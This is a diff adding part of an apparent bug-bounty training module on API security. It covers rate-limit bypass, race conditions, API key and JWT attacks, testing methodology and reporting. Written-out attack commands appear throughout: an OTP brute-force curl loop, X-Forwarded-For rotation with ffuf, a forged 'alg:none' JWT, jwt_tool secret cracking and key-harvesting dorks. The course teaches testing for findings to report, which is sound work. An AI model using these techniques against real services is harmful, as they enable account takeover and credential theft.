+<span class="kw">POST</span> /api/v1/login         <span class="comment"># Version prefix = new bucket</span>
+<span class="kw">POST</span> /api/login%00         <span class="comment"># Null byte appended</span>
+<span class="kw">POST</span> /api/login?dummy=1    <span class="comment"># Unique query param = new bucket</span>
+
+<span class="comment"># Using ffuf to test rate limit bypass with rotating X-Forwarded-For</span>
+$ <span class="kw">ffuf</span> <span class="flag">-u</span> <span class="str">https://target.com/api/login</span> \
+     <span class="flag">-X</span> POST \
+     <span class="flag">-H</span> <span class="str">"Content-Type: application/json"</span> \
+     <span class="flag">-H</span> <span class="str">"X-Forwarded-For: FUZZ"</span> \
+     <span class="flag">-w</span> <span class="str">ips.txt</span> \
+     <span class="flag">-d</span> <span class="str">'{"email":"admin@target.com","password":"PASSWORD"}'</span>
+</div>
+
+            <h3>Race Conditions in Rate Limiting</h3>
+
+            <p>
+                Distributed rate limiters that use shared counters (Redis, Memcached) are vulnerable to
+                race conditions. If the rate limit is 5 requests per minute and you send 20 requests
+                simultaneously, the counter may not increment fast enough to block requests 6 through 20.
+                This is especially effective against OTP verification endpoints &mdash; send all possible
+                4-digit OTP values in parallel and the rate limiter may not catch the burst.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Race condition exploit: send many requests simultaneously</span>
+<span class="comment"># Using turbo-intruder (Burp extension) or GNU parallel</span>
+
+<span class="comment"># Generate OTP values and send all at once</span>
+$ <span class="kw">seq</span> 0000 9999 | <span class="kw">xargs</span> <span class="flag">-P</span> 50 <span class="flag">-I</span> {} \
+    <span class="kw">curl</span> <span class="flag">-s</span> <span class="flag">-o</span> /dev/null <span class="flag">-w</span> <span class="str">"%{http_code} {}\n"</span> \
+    <span class="flag">-X</span> POST https://target.com/api/verify-otp \
+    <span class="flag">-H</span> <span class="str">"Content-Type: application/json"</span> \
+    <span class="flag">-H</span> <span class="str">"Cookie: session=abc123"</span> \
+    <span class="flag">-d</span> <span class="str">"{\"otp\": \"{}\"}"</span>
+
+<span class="comment"># If rate limit is bypassed, one request returns 200 = valid OTP found</span>
+</div>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Rate Limit Bypass Impact Statement</div>
+                    <div class="callout-text">
+                        A rate limiting bypass alone may be triaged as low/medium severity. To maximize
+                        impact in your report, demonstrate what the bypass enables: "The rate limit on
+                        the OTP verification endpoint can be bypassed using X-Forwarded-For header rotation,
+                        allowing an attacker to brute-force any 6-digit OTP in approximately 17 minutes,
+                        leading to account takeover of any user." Chain the bypass with its downstream
+                        impact &mdash; brute-force, credential stuffing, or data exfiltration.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 7: API Key & Token Security -->
+    <div class="section" id="s7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128273;</span>
+            API Key &amp; Token Security
+        </h2>
+        <div class="section-body">
+            <p>
+                API keys, JWT tokens, and OAuth tokens are the authentication credentials of the API
+                world. When these credentials leak, are improperly scoped, or are incorrectly validated,
+                the consequences range from data exposure to full account takeover. API key and token
+                vulnerabilities are some of the easiest findings to demonstrate and report because the
+                impact is immediately clear.
+            </p>
+
+            <h3>API Key Leakage Vectors</h3>
+
+            <p>
+                API keys end up in places developers never intended. A systematic search of the following
+                locations will frequently reveal exposed credentials:
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128196;</div>
+                    <div class="concept-card-title">JavaScript Source</div>
+                    <div class="concept-card-body">
+                        Client-side JavaScript bundles frequently contain API keys for maps, analytics,
+                        payment processors, and backend services. Minification is not obfuscation &mdash;
+                        beautify the code and search for key patterns.
+                    </div>
+                    <span class="concept-tag">Frontend</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128241;</div>
+                    <div class="concept-card-title">Mobile Applications</div>
+                    <div class="concept-card-body">
+                        Mobile app binaries embed API keys in strings tables, configuration files, and
+                        compiled code. Decompile APK/IPA files and search for endpoints, tokens, and
+                        secrets stored in the binary.
+                    </div>
+                    <span class="concept-tag">Mobile</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128193;</div>
+                    <div class="concept-card-title">Git Repositories</div>
+                    <div class="concept-card-body">
+                        Credentials committed to public repos persist in git history even after deletion.
+                        Search GitHub with dorks: <code style="color: #c084fc;">"target.com" api_key</code>,
+                        <code style="color: #c084fc;">org:targetorg password</code>. Check commit history.
+                    </div>
+                    <span class="concept-tag">Source Code</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#9888;</div>
+                    <div class="concept-card-title">Error Messages</div>
+                    <div class="concept-card-body">
+                        Stack traces and debug output frequently include API keys, connection strings,
+                        and internal tokens. Trigger errors with malformed input and inspect the response
+                        for leaked credentials.
+                    </div>
+                    <span class="concept-tag">Debug Output</span>
+                </div>
+            </div>
+
+            <div class="code-block">
+<span class="comment"># JavaScript source mining for API keys</span>
+<span class="comment"># Download and beautify JavaScript bundles</span>
+$ <span class="kw">curl</span> <span class="flag">-s</span> https://target.com/static/js/main.chunk.js | <span class="kw">js-beautify</span> &gt; main.js
+
+<span class="comment"># Search for common key patterns</span>
+$ <span class="kw">grep</span> <span class="flag">-iE</span> <span class="str">"(api_key|apiKey|api_secret|secret_key|access_token|auth_token|private_key|client_secret)"</span> main.js
+
+<span class="comment"># Search for hardcoded credentials</span>
+$ <span class="kw">grep</span> <span class="flag">-iE</span> <span class="str">"(password|passwd|pwd|bearer|token|authorization)"</span> main.js
+
+<span class="comment"># AWS key pattern</span>
+$ <span class="kw">grep</span> <span class="flag">-oE</span> <span class="str">"AKIA[0-9A-Z]{16}"</span> main.js
+
+<span class="comment"># GitHub secret scanning dorks</span>
+<span class="comment"># Search: "target.com" "api_key" OR "apiKey" OR "secret"</span>
+<span class="comment"># Search: org:targetorg filename:.env</span>
+<span class="comment"># Search: org:targetorg "DB_PASSWORD"</span>
+
+<span class="comment"># trufflehog &mdash; scans git repos for high-entropy strings and known key patterns</span>
+$ <span class="kw">trufflehog</span> <span class="flag">--regex</span> <span class="flag">--entropy=True</span> https://github.com/target/repo.git
+</div>
+
+            <h3>JWT vs API Key vs OAuth Token</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Credential Type</th>
+                        <th>Structure</th>
+                        <th>Common Vulnerabilities</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">API Key</td>
+                        <td>Static string, often hex or base64. No expiration unless explicitly managed. Typically sent as a header or query parameter.</td>
+                        <td>No rotation policy, overly broad scope, shared across environments, leaked in client-side code or logs.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">JWT (JSON Web Token)</td>
+                        <td>Three base64url segments: header.payload.signature. Self-contained &mdash; the payload includes claims like user ID, role, and expiration.</td>
+                        <td>Algorithm confusion (none/HS256/RS256), missing signature verification, long or no expiration, sensitive data in payload, JWK injection.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">OAuth 2.0 Token</td>
+                        <td>Access token (short-lived) + refresh token (long-lived). May be opaque strings or JWTs. Scoped to specific permissions.</td>
+                        <td>Insecure redirect_uri validation, authorization code interception, token leakage via Referer, insufficient scope restrictions, PKCE bypass.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>JWT Attack Techniques</h3>
+
+            <div class="code-block">
+<span class="comment"># JWT structure: header.payload.signature</span>
+<span class="comment"># Decode a JWT (base64url decode each segment)</span>
+
+<span class="comment"># Header</span>
+{<span class="str">"alg"</span>: <span class="str">"HS256"</span>, <span class="str">"typ"</span>: <span class="str">"JWT"</span>}
+
+<span class="comment"># Payload</span>
+{<span class="str">"sub"</span>: <span class="str">"1001"</span>, <span class="str">"name"</span>: <span class="str">"alice"</span>, <span class="str">"role"</span>: <span class="str">"user"</span>, <span class="str">"exp"</span>: 1708387200}
+
+<span class="comment"># Attack 1: Algorithm "none" — remove signature verification</span>
+<span class="comment"># Change header to {"alg": "none"} and remove the signature</span>
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIn0.
+
+<span class="comment"># Attack 2: Algorithm confusion (RS256 -> HS256)</span>
+<span class="comment"># If server uses RS256 (asymmetric), switch to HS256 (symmetric)</span>
+<span class="comment"># Sign with the server's PUBLIC key (which is available)</span>
+<span class="comment"># Server verifies HS256 signature using its public key = valid</span>
+
+<span class="comment"># Attack 3: Modify payload claims</span>
+<span class="comment"># Change "role": "user" to "role": "admin"</span>
+<span class="comment"># Change "sub": "1001" to "sub": "1" (admin user)</span>
+<span class="comment"># If signature is not properly verified, the modified token is accepted</span>
+
+<span class="comment"># Tool: jwt_tool for automated JWT testing</span>
+$ <span class="kw">python3</span> jwt_tool.py <span class="str">&lt;JWT_TOKEN&gt;</span> <span class="flag">-M</span> at  <span class="comment"># Run all tests</span>
+$ <span class="kw">python3</span> jwt_tool.py <span class="str">&lt;JWT_TOKEN&gt;</span> <span class="flag">-X</span> a   <span class="comment"># Test alg:none</span>
+$ <span class="kw">python3</span> jwt_tool.py <span class="str">&lt;JWT_TOKEN&gt;</span> <span class="flag">-X</span> k   <span class="comment"># Test key confusion</span>
+$ <span class="kw">python3</span> jwt_tool.py <span class="str">&lt;JWT_TOKEN&gt;</span> <span class="flag">-C</span> <span class="flag">-d</span> <span class="str">wordlist.txt</span>  <span class="comment"># Crack HS256 secret</span>
+</div>
+
+            <h3>Token Scope Testing</h3>
+
+            <p>
+                API keys and tokens should follow the principle of least privilege &mdash; each credential
+                should only grant access to the resources and actions it explicitly needs. Overly permissive
+                tokens are a common finding: a read-only API key that also allows write operations, a
+                user-scoped token that can access admin endpoints, or a token issued for one microservice
+                that is accepted by all microservices.
+            </p>
+
+            <ol class="numbered-list">
+                <li><strong style="color: #c4a0d8;">Document the token's intended scope</strong> by reading the API documentation and observing what operations the frontend performs with the token.</li>
+                <li><strong style="color: #c4a0d8;">Test operations outside the intended scope.</strong> If the token is labeled "read-only," attempt POST, PUT, PATCH, and DELETE requests. If it is scoped to "users," attempt to access admin, billing, or configuration endpoints.</li>
+                <li><strong style="color: #c4a0d8;">Test cross-service acceptance.</strong> If the target has multiple APIs or microservices, send the token to each one. A token issued by the user service should not be accepted by the payment service.</li>
+                <li><strong style="color: #c4a0d8;">Test expired tokens.</strong> Send requests with tokens that have passed their expiration time. Some servers do not validate the <code style="color: #c084fc;">exp</code> claim.</li>
+                <li><strong style="color: #c4a0d8;">Test revoked tokens.</strong> Change the account password or explicitly revoke the token, then test if the old token still works. Stateless JWT implementations often cannot revoke tokens until they expire.</li>
+            </ol>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Reporting Leaked API Keys</div>
+                    <div class="callout-text">
+                        When reporting a leaked API key, include: (1) the exact location where the key was
+                        found, (2) the service the key authenticates to, (3) the permissions the key grants
+                        (tested by making API calls with it), and (4) the potential impact of those
+                        permissions. A leaked Google Maps API key with no usage restrictions is low severity.
+                        A leaked AWS key with S3 read access to customer data buckets is critical. Always
+                        verify the key is active and demonstrate its scope without accessing actual user data.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 8: API Testing Methodology -->
+    <div class="section" id="s8">
+        <div class="section-number">Section 08</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9878;</span>
+            API Testing Methodology
+        </h2>
+        <div class="section-body">
+            <h3>Systematic API Assessment Workflow</h3>
+
+            <p>
+                A structured API testing methodology ensures comprehensive coverage and reproducible results.
+                Unlike web application testing where you interact with a visual interface, API testing is
+                entirely request-response based. Every finding must be documented with exact HTTP requests
+                that can be replayed by the triage team.
+            </p>
+
+            <ol class="numbered-list">
+                <li><strong style="color: #c4a0d8;">API discovery and inventory.</strong> Enumerate all API endpoints through documentation hunting (Swagger/OpenAPI), JavaScript source analysis, traffic interception, and directory fuzzing. Build a complete endpoint inventory including method, path, parameters, authentication, and expected response.</li>
+                <li><strong style="color: #c4a0d8;">Authentication analysis.</strong> Identify the authentication mechanism (API key, JWT, OAuth, session cookie). Test for missing authentication, weak token generation, algorithm confusion (JWT), and credential leakage in responses, logs, or client-side code.</li>
+                <li><strong style="color: #c4a0d8;">Authorization testing (BOLA/BFLA).</strong> Create accounts at multiple privilege levels. Test every endpoint for horizontal access (User A accessing User B's data) and vertical access (regular user invoking admin functions). Use Autorize for automated coverage.</li>
+                <li><strong style="color: #c4a0d8;">Input validation testing.</strong> Test all parameters for injection (SQL, NoSQL, command, SSTI), mass assignment (adding unexpected fields), and type confusion (sending strings where integers are expected, arrays where strings are expected).</li>
+                <li><strong style="color: #c4a0d8;">Rate limiting and resource consumption.</strong> Test for missing or bypassable rate limits on authentication, password reset, OTP verification, and data export endpoints. Test for pagination abuse (requesting page_size=999999).</li>
+                <li><strong style="color: #c4a0d8;">Business logic analysis.</strong> Understand the application's workflows and test for logic flaws: can you skip steps in a multi-stage process, replay completed transactions, access resources in an unintended order, or abuse referral and discount systems via API?</li>
+                <li><strong style="color: #c4a0d8;">Data exposure review.</strong> Compare API responses to frontend rendering. Document any fields in API responses that are not displayed in the UI &mdash; these represent excessive data exposure (OWASP API3).</li>
+                <li><strong style="color: #c4a0d8;">Documentation and reporting.</strong> For every finding, capture the complete HTTP request and response, provide step-by-step reproduction instructions, quantify the business impact, and suggest a specific remediation.</li>
+            </ol>
+
+            <h3>Postman Collections for API Testing</h3>
+
+            <p>
+                Postman is not just a development tool &mdash; it is a powerful API security testing
+                platform. Import the target's API documentation (Swagger, OpenAPI) directly into Postman
+                to generate a complete collection of requests. Then use environments and variables to
+                manage multiple authentication tokens and test across privilege levels.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Postman workflow for API security testing</span>
+
+<span class="comment"># 1. Import API spec</span>
+<span class="comment">#    File > Import > Link: https://target.com/swagger.json</span>
+<span class="comment">#    This creates a request for every documented endpoint</span>
+
+<span class="comment"># 2. Create environments for different privilege levels</span>
+<span class="comment">#    Environment: "User A"    -> token: eyJhbGci...userA</span>
+<span class="comment">#    Environment: "User B"    -> token: eyJhbGci...userB</span>
+<span class="comment">#    Environment: "Admin"     -> token: eyJhbGci...admin</span>
+<span class="comment">#    Environment: "No Auth"   -> token: (empty)</span>
+
+<span class="comment"># 3. Set collection-level authorization</span>
+<span class="comment">#    Authorization: Bearer Token = {{token}}</span>
+<span class="comment">#    Inherits from collection to all requests</span>
+
+<span class="comment"># 4. Test BOLA: run Admin collection with User A environment</span>
+<span class="comment">#    Any 200 response = potential BFLA</span>
+
+<span class="comment"># 5. Pre-request scripts for dynamic testing</span>
+<span class="comment">#    Add randomized test data, capture response IDs for chained requests</span>
+
+<span class="comment"># 6. Test scripts for automated validation</span>
+pm.test(<span class="str">"Should return 403 for unauthorized access"</span>, function() {
+    pm.response.to.have.status(403);
+});
+
+pm.test(<span class="str">"Response should not contain sensitive fields"</span>, function() {
+    var json = pm.response.json();
+    pm.expect(json).to.not.have.property(<span class="str">"password"</span>);
+    pm.expect(json).to.not.have.property(<span class="str">"password_hash"</span>);
+    pm.expect(json).to.not.have.property(<span class="str">"ssn"</span>);
+    pm.expect(json).to.not.have.property(<span class="str">"credit_card"</span>);
+});
+</div>
+
+            <h3>Burp Suite for API Testing</h3>
+
+            <p>
+                Burp Suite is the industry standard for API security testing. Configure your browser or
+                application to proxy through Burp, interact with the application normally, and Burp
+                captures every API request in its HTTP History. From there, use these features:
+            </p>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#128375; Core Features</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span>Proxy: intercept, inspect, and modify API requests in real time</li>
+                        <li><span class="li-marker">&#9654;</span>Repeater: replay and modify individual requests for manual testing</li>
+                        <li><span class="li-marker">&#9654;</span>Intruder: automated payload delivery for fuzzing parameters and IDs</li>
+                        <li><span class="li-marker">&#9654;</span>Scanner: automated vulnerability scanning against captured endpoints</li>
+                        <li><span class="li-marker">&#9654;</span>Comparer: diff responses to detect subtle authorization differences</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#128268; Key Extensions</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span>Autorize: automated BOLA/BFLA testing across privilege levels</li>
+                        <li><span class="li-marker">&#9654;</span>Param Miner: discovers hidden parameters and headers</li>
+                        <li><span class="li-marker">&#9654;</span>InQL: GraphQL introspection, query generation, and analysis</li>
+                        <li><span class="li-marker">&#9654;</span>JSON Web Token Attacker: JWT manipulation and attack automation</li>
+                        <li><span class="li-marker">&#9654;</span>Logger++: advanced logging with regex filters for API traffic analysis</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Automating API Security Checks</h3>
+
+            <p>
+                Manual testing is essential for logic-dependent vulnerabilities, but many API security
+                checks can be automated. Build scripts that run against every endpoint in your inventory:
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Automated BOLA checker (Python pseudocode)</span>
+<span class="comment"># For each endpoint with an ID parameter:</span>
+<span class="comment"># 1. Make a request with User A's token and User A's ID (baseline)</span>
+<span class="comment"># 2. Make a request with User B's token and User A's ID (BOLA test)</span>
+<span class="comment"># 3. Compare: if responses are similar, flag as potential BOLA</span>
+
+<span class="kw">import</span> requests
+
+endpoints = [
+    {<span class="str">"method"</span>: <span class="str">"GET"</span>,  <span class="str">"path"</span>: <span class="str">"/api/v1/users/{id}/profile"</span>},
+    {<span class="str">"method"</span>: <span class="str">"GET"</span>,  <span class="str">"path"</span>: <span class="str">"/api/v1/users/{id}/orders"</span>},
+    {<span class="str">"method"</span>: <span class="str">"GET"</span>,  <span class="str">"path"</span>: <span class="str">"/api/v1/users/{id}/settings"</span>},
+    {<span class="str">"method"</span>: <span class="str">"DELETE"</span>, <span class="str">"path"</span>: <span class="str">"/api/v1/users/{id}/sessions"</span>},
+]
+
+user_a = {<span class="str">"id"</span>: <span class="str">"1001"</span>, <span class="str">"token"</span>: <span class="str">"eyJ...userA"</span>}
+user_b = {<span class="str">"id"</span>: <span class="str">"1002"</span>, <span class="str">"token"</span>: <span class="str">"eyJ...userB"</span>}
+
+<span class="kw">for</span> ep <span class="kw">in</span> endpoints:
+    path = ep[<span class="str">"path"</span>].replace(<span class="str">"{id}"</span>, user_a[<span class="str">"id"</span>])
+    <span class="comment"># Request with User B's token, User A's resource</span>
+    resp = requests.request(
+        ep[<span class="str">"method"</span>],
+        f<span class="str">"https://target.com{path}"</span>,
+        headers={<span class="str">"Authorization"</span>: f<span class="str">"Bearer {user_b['token']}"</span>}
+    )
+    <span class="kw">if</span> resp.status_code == <span class="str">200</span>:
+        <span class="kw">print</span>(f<span class="str">"[BOLA] {ep['method']} {path} -> {resp.status_code}"</span>)
+</div>
+
+            <h3>Reporting API Vulnerabilities with Business Impact</h3>
+
+            <p>
+                API vulnerability reports require precise technical detail because the triage team must
+                reproduce the issue using only your HTTP requests &mdash; there is no visual interface to
+                reference. Every report should include:
+            </p>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">Complete HTTP request</strong> &mdash; Method, URL, headers (including Authorization), and body. Redact only genuinely sensitive values; leave everything the triage team needs to reproduce.</li>
+                <li><strong style="color: #c4a0d8;">Complete HTTP response</strong> &mdash; Status code, headers, and body. Highlight the specific fields that demonstrate the vulnerability.</li>
+                <li><strong style="color: #c4a0d8;">Reproduction steps</strong> &mdash; Numbered sequence: (1) create account A, (2) create account B, (3) as account B send this request, (4) observe that account A's data is returned.</li>
+                <li><strong style="color: #c4a0d8;">Business impact statement</strong> &mdash; Translate technical findings into business terms: "An attacker can read any user's profile data including email, phone number, and billing address by incrementing the user ID in the API request. With approximately 500,000 users on the platform, this exposes PII for the entire user base."</li>
+                <li><strong style="color: #c4a0d8;">Remediation guidance</strong> &mdash; Specific, actionable advice: "Implement server-side authorization checks in the /api/v1/users/{id}/profile handler to verify the requesting user's ID matches the requested resource ID, or that the requesting user has an admin role."</li>
+            </ul>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">The API Testing Checklist</div>
+                    <div class="callout-text">
+                        For every API endpoint you discover, ask these questions: (1) Does it require
+                        authentication? Remove the token and check. (2) Does it enforce authorization?
+                        Send another user's token. (3) Does it validate all input? Send unexpected types,
+                        extra fields, and injection payloads. (4) Does it rate limit? Send 100 rapid
+                        requests. (5) Does it expose excessive data? Compare the API response to the
+                        frontend rendering. (6) Does it exist on deprecated API versions? Check v1 and v2.
+                        These six questions, applied systematically to every endpoint, will find the
+                        majority of API vulnerabilities.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Discussion Prompts -->
+    <div class="section" id="discuss">
+        <div class="discussion-section">
+            <div class="discussion-title">
+                <span>&#128172;</span>
+                Discussion Prompts
+            </div>
+            <ul class="prompt-list">
+                <li class="prompt-item">
+                    <span class="prompt-num">01</span>
+                    How does the shift from server-rendered web applications to API-driven single-page applications change the attack surface? Consider that the API must now expose all business logic that was previously hidden server-side. What new vulnerability classes emerge from this architectural pattern?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">02</span>
+                    GraphQL's flexibility is both its strength and its security weakness. How would you design a GraphQL API that provides the query flexibility developers want while preventing introspection abuse, nested query DoS, and resolver-level authorization bypass? What trade-offs are involved?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">03</span>
+                    Rate limiting is often implemented at the reverse proxy or API gateway level, separate from the application logic. What are the consequences of this architectural separation? How does it affect the consistency of rate limiting across different endpoint types, and what gaps does it create for attackers?
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You have covered REST API enumeration and endpoint discovery, GraphQL security
+                including introspection, batching, and nested query attacks, gRPC and WebSocket
+                testing techniques, BOLA and BFLA authorization bypass methodologies from the
+                OWASP API Security Top 10, mass assignment and HTTP parameter pollution, rate
+                limiting bypass techniques and race conditions, API key and JWT token security
+                analysis, and systematic API assessment workflows with reporting guidance.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module 08
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    // Scroll progress bar
+    function updateScrollProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    // Section fade-in via IntersectionObserver
+    function initSectionAnimations() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    }
+
+    // Detail toggle
+    function toggleDetail(el) {
+        const content = el.nextElementSibling;
+        const arrow = el.querySelector('.detail-toggle-arrow');
+        content.classList.toggle('open');
+        if (arrow) {
+            arrow.style.transform = content.classList.contains('open') ? 'rotate(90deg)' : 'rotate(0deg)';
+        }
+    }
+
+    // Module completion
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'bh-mod-api-security', {
+                returnUrl: '../index.html'
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        initSectionAnimations();
+    });
+</script>
+
+</body>
+</html>
